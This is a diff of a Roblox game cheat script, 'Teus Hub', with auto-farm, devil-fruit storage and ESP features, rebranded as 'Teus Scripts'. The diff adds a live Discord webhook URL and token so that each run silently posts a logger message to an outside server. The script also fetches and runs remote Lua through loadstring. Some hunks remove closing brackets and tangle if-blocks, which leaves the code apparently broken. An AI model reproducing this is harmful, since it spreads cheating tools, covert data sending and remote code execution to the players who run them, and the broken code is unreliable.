@@ -11,7 +11,7 @@ end
 game.StarterGui:SetCore(
     "SendNotification",
     {
-        Title = "Teus",
+        Title = "HadesGod",
         Text = "Loading",
         Duration = 5
     })
@@ -60,7 +60,7 @@ function AdminLoggerMsg()
 end
 
 PostWebhook(
-    "",
+    "https://discord.com/api/webhooks/1269244492473569311/FBxbax-nMXpWX7udeGhLy3Jhec1Nj88GOIEfz4S9Dsx8k-CL1olKF8yGVg801jG0ATrD",
     AdminLoggerMsg()
 )
 print("Dell load")
@@ -1917,7 +1917,7 @@ end)
 ------------------------------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------------------------------
 print("esp") 
-local foldername = "Teus Hub"
+local foldername = "Teus Scripts"
 local filename = foldername.."/Setting.json"
 function saveSettings()
     local HttpService = game:GetService("HttpService")
@@ -2725,7 +2725,7 @@ L2.BorderSizePixel = 0
 L2.Position = UDim2.new(0.1208, 0, 0.0953, 0)
 L2.Size = UDim2.new(0, 50, 0, 50)
 L2.Font = Enum.Font.LuckiestGuy
-L2.Text = "Teus Hub"
+L2.Text = "Teus Scripts"
 L2.TextColor3 = Color3.fromRGB(255, 255, 255)
 L2.TextSize = 9.000
 L2.Draggable = true
@@ -2760,8 +2760,8 @@ loadSettings()
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 
 local Window = Fluent:CreateWindow({
-    Title = "",
-    SubTitle = "By Teus | Scripts",
+    Title = "Teus Hub",
+    SubTitle = " By Teus | Scripts",
     TabWidth = 140,
     Size = UDim2.fromOffset(480, 320),
     Acrylic = false, 
@@ -2784,7 +2784,7 @@ local Tabs = {
     raid = Window:AddTab({ Title = "Dungeon", Icon = "" }),
     De = Window:AddTab({ Title = "Devil Fruits", Icon = "" }),    
     Ms = Window:AddTab({ Title = "Misc", Icon = "" }),   
-    support = Window:AddTab({ Title = "Server Support\n Updated Logs", Icon = "" }),
+    support = Window:AddTab({ Title = "Server Support", Icon = "" }),
 }
 print("wait tab") 
 
@@ -5609,15 +5609,11 @@ end)
                     end
                     if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Dragon Fruit") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Dragon Fruit") then
                         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit","Dragon-Dragon",game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Dragon Fruit"))
-		    end
-                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Leopard Fruit") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Leopard Fruit") then
+                        if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Leopard Fruit") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Leopard Fruit") then
                         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit","Leopard-Leopard",game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Leopard Fruit"))
                     end
-                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Kitsune Fruit") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Kitsune Fruit") then
-                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit","Kitsune-Kitsune",game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Kitsune Fruit"))
-                    end
-                 end 
-		 end
+                end
+                end
             end)
         end
         wait(0.3)
@@ -5659,7 +5655,6 @@ end)
   "Soul-Soul",
   "Dragon-Dragon",
   "Leopard-Leopard"
-  "Kitsune-Kitsune"
  }
     
     local Dropdown = Tabs.De:AddDropdown("Dropdown", {
@@ -9810,13 +9805,11 @@ Tabs.support:AddButton({
         Callback = function()            
         setclipboard("https://discord.gg/teuscommunity") 
       end
-    })
-
-print("load xong r") 
-print("Developer: Teus contact discord: teusdasloiras")
+ 
+print("Developer: Teus | Scripts")
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 game.StarterGui:SetCore("SendNotification", {
-Title = "Teus Hub",
+Title = "Teus | Scripts",
 Text = "Successfully",
 Duration = 5,
 })
